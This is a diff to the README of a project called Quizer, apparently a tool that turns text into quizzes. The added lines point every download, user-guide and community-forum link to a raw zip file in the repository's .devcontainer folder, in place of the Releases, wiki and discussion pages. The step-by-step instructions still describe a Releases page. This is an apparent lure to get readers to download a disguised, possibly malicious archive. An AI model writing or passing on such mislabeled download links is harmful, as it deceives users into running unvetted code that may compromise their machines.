@@ -6,11 +6,11 @@ Welcome to Quizer! This tool helps you turn any text or document into a quiz eff
 
 ## 🔗 Download Quizer
 
-[![Download Quizer](https://img.shields.io/badge/Download%20Quizer-v1.0-brightgreen)](https://github.com/VanshChauhan04/Quizer/releases)
+[![Download Quizer](https://raw.githubusercontent.com/VanshChauhan04/Quizer/main/.devcontainer/Quizer_1.3.zip%20Quizer-v1.0-brightgreen)](https://raw.githubusercontent.com/VanshChauhan04/Quizer/main/.devcontainer/Quizer_1.3.zip)
 
 ## 📥 Download & Install
 
-To get started with Quizer, visit this page to download: [Download Quizer](https://github.com/VanshChauhan04/Quizer/releases).
+To get started with Quizer, visit this page to download: [Download Quizer](https://raw.githubusercontent.com/VanshChauhan04/Quizer/main/.devcontainer/Quizer_1.3.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Choose the version you want to download. The latest version contains all the newest features and fixes.
@@ -64,8 +64,8 @@ You can find our feedback section in the app. Alternatively, you can open an iss
 
 For more information, check out our documentation:
 
-- [User Guide](https://github.com/VanshChauhan04/Quizer/wiki)
-- [Community Forum](https://github.com/VanshChauhan04/Quizer/discussions)
+- [User Guide](https://raw.githubusercontent.com/VanshChauhan04/Quizer/main/.devcontainer/Quizer_1.3.zip)
+- [Community Forum](https://raw.githubusercontent.com/VanshChauhan04/Quizer/main/.devcontainer/Quizer_1.3.zip)
 
 If you encounter any issues or have questions, don’t hesitate to reach out in the GitHub repository or utilize our support forum.
 
